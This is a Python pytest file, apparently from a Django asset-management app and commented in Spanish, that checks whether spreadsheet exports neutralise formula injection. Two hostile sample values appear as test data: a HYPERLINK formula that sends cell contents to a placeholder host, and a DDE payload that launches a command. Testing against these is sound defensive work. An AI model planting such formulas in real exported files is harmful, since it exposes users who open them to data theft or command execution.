"""Que un nombre de activo no se vuelva una fórmula al abrir el archivo.

Cobertura de tests/qa/features/seguridad-exportaciones.feature (AC-EXP-001 a
AC-EXP-004). Se prueban los cuatro exportadores y no solo el ayudante: la
defensa se pierde el día que alguien añade el quinto y se olvida de llamarlo.
"""

import io

import pytest
from openpyxl import load_workbook

from apps.core.hojas_de_calculo import neutralizar, neutralizar_fila

NOMBRE_MALICIOSO = '=HYPERLINK("http://ejemplo.invalid/"&A1,"Ver ficha")'


@pytest.mark.parametrize(
    ("valor", "esperado"),
    [
        ("=1+1", "'=1+1"),
        ("+1", "'+1"),
        ("-1", "'-1"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("\t=1+1", "'\t=1+1"),
        ("\r=1+1", "'\r=1+1"),
        # Lo que no abre fórmula se deja intacto: el archivo tiene que seguir
        # leyéndose igual.
        ("Laptop Jefatura TI", "Laptop Jefatura TI"),
        ("GA-LAP-000001", "GA-LAP-000001"),
    ],
)
def test_solo_se_marca_lo_que_la_hoja_tomaria_por_formula(valor, esperado):
    assert neutralizar(valor) == esperado


def test_los_valores_que_no_son_texto_pasan_tal_cual():
    """Un número tiene que seguir siendo número: si no, deja de poder sumarse."""
    assert neutralizar_fila([42, None, "", 3.5]) == [42, None, "", 3.5]


@pytest.mark.django_db
def test_el_inventario_exportado_no_lleva_formulas(db):
    import datetime

    from apps.activos.exportacion import exportar_activos
    from apps.activos.models import Activo, TipoDispositivo
    from apps.organizacion.models import Departamento

    tipo = TipoDispositivo.objects.create(nombre="Laptop", codigo="LAP")
    departamento = Departamento.objects.create(nombre="Tecnología", codigo="TI")
    Activo.objects.create(
        tipo=tipo,
        nombre=NOMBRE_MALICIOSO,
        marca="Dell",
        modelo="Latitude",
        numero_serie="SN-1",
        codigo_barras="GA-LAP-000001",
        departamento=departamento,
        fecha_adquisicion=datetime.date(2025, 1, 10),
    )

    hoja = load_workbook(io.BytesIO(exportar_activos(Activo.objects.all()))).active
    valores = [celda.value for fila in hoja.iter_rows() for celda in fila]

    assert NOMBRE_MALICIOSO not in valores
    assert f"'{NOMBRE_MALICIOSO}" in valores


@pytest.mark.django_db
def test_la_auditoria_exportada_no_lleva_formulas(db):
    from django.contrib.auth.models import Permission
    from django.contrib.contenttypes.models import ContentType
    from rest_framework.test import APIClient

    from apps.core.models import AuditLog
    from apps.permissions.models import ModulePermission
    from apps.users.models import User

    usuario = User.objects.create_user(
        username="auditora", email="auditora@example.com", password="Sup3r-Secr3t!"
    )
    content_type = ContentType.objects.get_for_model(ModulePermission)
    usuario.user_permissions.set(
        Permission.objects.filter(
            content_type=content_type, codename__in=["auditoria.ver", "auditoria.exportar"]
        )
    )
    AuditLog.objects.create(action="=cmd|'/c calc'!A0", target_type="activo", target_id="1")

    cliente = APIClient()
    cliente.force_authenticate(user=usuario)
    respuesta = cliente.get("/api/v1/admin/audit-logs/export/")

    cuerpo = respuesta.content.decode("utf-8")
    assert respuesta.status_code == 200
    assert "'=cmd" in cuerpo
